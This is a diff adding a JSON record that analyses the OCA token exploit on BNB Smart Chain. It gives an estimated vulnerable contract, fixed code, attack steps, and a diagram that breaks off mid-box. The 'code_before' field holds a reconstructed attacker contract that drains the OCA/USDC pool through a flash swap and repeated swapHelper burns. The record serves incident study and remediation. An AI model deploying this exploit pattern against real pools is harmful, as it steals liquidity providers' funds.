@@ -1,0 +1,41 @@
+{
+ "id": "2026__2026-02-13_OCA_BusinessLogic_BSC",
+ "source_file": "2026/2026-02-13_OCA_BusinessLogic_BSC.md",
+ "title": "OCA — AMM Reserve Manipulation via Deflationary Token sellOCA() Logic Flaw Analysis",
+ "date": "2026-02-13",
+ "protocol": "OCA",
+ "chain": "BNB Smart Chain",
+ "loss_raw": "~$433,000 (OCA damage) + ~$422,000 (Unknown Protocol simultaneous damage)",
+ "loss_usd": 433000.0,
+ "root_cause": "Business Logic Flaw — `sellOCA()` / `swapHelper()` functions allowed unauthorized LP reserve manipulation during flash swap callbacks",
+ "attack_tx": "0xcd59...906 (block 81,020,478)",
+ "vulnerable_contract": "OCA token contract (BSC)",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable OCA token contract (estimated)\n// Anyone can call swapHelper to remove OCA from the LP and trigger sync()\n\naddress public uniswapV2Pair;  // OCA/USDC PancakeSwap V2 pair\nuint256 public swapFeeRate = 5; // 5% fee\n\nfunction swapHelper(uint256 amount) public {\n    // ❌ No msg.sender validation — callable by anyone\n    // ❌ No reentrancy protection during flash swap callbacks\n\n    uint256 feeAmount = amount * swapFeeRate / 100;\n\n    // ❌ Directly removes OCA tokens from LP pair (burn or transfer to dead address)\n    _burn(uniswapV2Pair, feeAmount);\n\n    // ❌ Calls sync() to forcibly rebalance AMM reserves\n    // → OCA balance decreases, USDC ratio rises → price distortion\n    IUniswapV2Pair(uniswapV2Pair).sync();\n}\n\nfunction sellOCA(uint256 amount) external {\n    // ❌ Allows external calls during flash swap callbacks\n    require(amount > 0, \"zero amount\");\n    \n    // Internally calls swapHelper — vulnerability exposed in callback chain\n    swapHelper(amount);\n\n    // Execute OCA → USDC swap\n    _swap(amount);\n}",
+  "// ❌ swapHelper can be called repeatedly within the flash swap callback\n// (attack contract's pancakeCall implementation — actual vulnerable flow)\n\nfunction pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n) external {\n    // Attacker: repeatedly calls OCA's swapHelper within the callback\n    // ❌ OCA contract permits this call (no access control)\n    for (uint i = 0; i < N_ITERATIONS; i++) {\n        IOCAToken(OCA).swapHelper(drainAmount);  // Repeatedly reduces LP reserves\n    }\n\n    // Realize USDC arbitrage at distorted price\n    IOCAToken(OCA).sellOCA(heldAmount);\n}",
+  "// SPDX-License-Identifier: UNLICENSED\n// Reconstructed OCA Attack PoC — For Educational Purposes\npragma solidity ^0.8.20;\n\ninterface IOCA {\n    // ❌ Core vulnerable function: public, callable by anyone\n    function swapHelper(uint256 amount) external;\n    function sellOCA(uint256 amount) external;\n}\n\ninterface IPancakePair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n    function sync() external;\n}\n\ncontract OCAAttacker {\n    address constant OCA_TOKEN = address(/* OCA token address */);\n    address constant OCA_USDC_PAIR = address(/* OCA/USDC PancakeSwap V2 pair */);\n    address constant USDC = address(/* USDC BSC address */);\n\n    // Step 1: Attack entry point — initiate flash swap\n    function attack() external {\n        (uint112 reserveOCA,,) = IPancakePair(OCA_USDC_PAIR).getReserves();\n        uint256 borrowAmount = uint256(reserveOCA) * 90 / 100; // Borrow 90%\n\n        // Flash swap: borrow OCA, repeatedly call swapHelper in callback\n        IPancakePair(OCA_USDC_PAIR).swap(\n            borrowAmount,  // OCA borrow amount\n            0,\n            address(this),\n            abi.encode(borrowAmount)  // callback data\n        );\n    }\n\n    // Step 2: Flash swap callback — core attack logic\n    function pancakeCall(\n        address /*sender*/,\n        uint256 amount0,\n        uint256 /*amount1*/,\n        bytes calldata /*data*/\n    ) external {\n        // ❌ Repeatedly call OCA swapHelper: burn OCA from LP + sync()\n        // More iterations → more LP OCA balance reduction → higher USDC ratio\n        uint256 drainUnit = amount0 / 10;\n        for (uint i = 0; i < 5; i++) {\n            // Each call burns drainUnit × feeRate from LP\n            IOCA(OCA_TOKEN).swapHelper(drainUnit);\n        }\n\n        // Step 3: Swap all held OCA to USDC at distorted price\n        // Since LP's OCA balance is reduced, same OCA yields more USDC\n        uint256 ocaBalance = IERC20(OCA_TOKEN).balanceOf(address(this));\n        IOCA(OCA_TOKEN).sellOCA(ocaBalance);\n\n        // Step 4: Repay flash swap (borrowed OCA + fees)\n        uint256 repayAmount = amount0 * 1000 / 997 + 1; // Including 0.3% fee\n        IERC20(OCA_TOKEN).transfer(OCA_USDC_PAIR, repayAmount);\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix 1: Apply reentrancy guard modifier\nbool private _inSwap;\n\nmodifier nonReentrant() {\n    require(!_inSwap, \"ReentrancyGuard: reentrant call\");\n    _inSwap = true;\n    _;\n    _inSwap = false;\n}\n\n// ✅ Fix 2: Change swapHelper to private so it can only be called from within the contract\nfunction _swapHelper(uint256 amount) private {\n    uint256 feeAmount = amount * swapFeeRate / 100;\n\n    // ✅ Instead of burning directly from LP, process from contract's own balance\n    _burn(address(this), feeAmount);  // Self-burn instead of LP burn\n\n    // ✅ Remove sync() call or allow only after internal transaction completes\n    // IUniswapV2Pair(uniswapV2Pair).sync(); // removed\n}\n\nfunction sellOCA(uint256 amount) external nonReentrant {\n    // ✅ nonReentrant blocks reentrancy during flash swap callbacks\n    require(amount > 0, \"zero amount\");\n    _swapHelper(amount);\n    _swap(amount);\n}",
+  "// ✅ 1. Change swapHelper to internal/private — block direct external calls\nfunction _swapHelper(uint256 amount) internal {\n    // Maintain internal logic only\n}\n\n// ✅ 2. Apply reentrancy guard (recommend OpenZeppelin ReentrancyGuard)\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nfunction sellOCA(uint256 amount) external nonReentrant {\n    require(amount > 0, \"zero amount\");\n    _swapHelper(amount);\n    _swap(amount);\n}\n\n// ✅ 3. Prohibit direct LP burns — process from contract's own balance instead\nfunction _swapHelper(uint256 amount) internal {\n    uint256 feeAmount = amount * swapFeeRate / 100;\n    // Burn from contract balance instead of direct LP burn\n    if (balanceOf(address(this)) >= feeAmount) {\n        _burn(address(this), feeAmount);\n        // ✅ Remove sync() call: unnecessary since LP balance was not directly modified\n    }\n}"
+ ],
+ "steps": [
+  "Step 1: Initiate PancakeSwap V2 Flash Swap",
+  "Step 2: Inside pancakeCall() — Repeated swapHelper() Calls",
+  "→ Direct OCA burn from LP (_burn) → sync() call",
+  "→ LP's OCA balance drops sharply, USDC balance relatively excess",
+  "→ OCA price artificially spikes (LP k value distorted)",
+  "Step 3: Execute OCA → USDC Swap at Distorted Price",
+  "→ Receive excessive USDC at distorted ratio",
+  "→ ~$433,000 worth of USDC drained (OCA LP)",
+  "Step 4: Simultaneous Unknown Protocol Attack",
+  "→ ~$422,000 additional drained",
+  "Step 5: Flash Swap Repayment + Profit Secured"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────────┐\n│  Attacker EOA: 0xdddfb3...                                           │\n│  ↓ Attack contract call()                                            │\n└──────────────────────┬──────────────────────────────────────────────┘\n                       │\n                       ▼\n┌─────────────────────────────────────────────────────────────────────┐\n│  Step 1: Initiate PancakeSwap V2 Flash Swap                          │\n│  Borrow large amount of OCA from OCA/USDC LP pair (flash swap)       │\n│  Callback address = attack contract                                   │\n└──────────────────────┬──────────────────────────────────────────────┘\n                       │ pancakeCall() callback triggered\n                       ▼\n┌────────────"
+ ]
+}
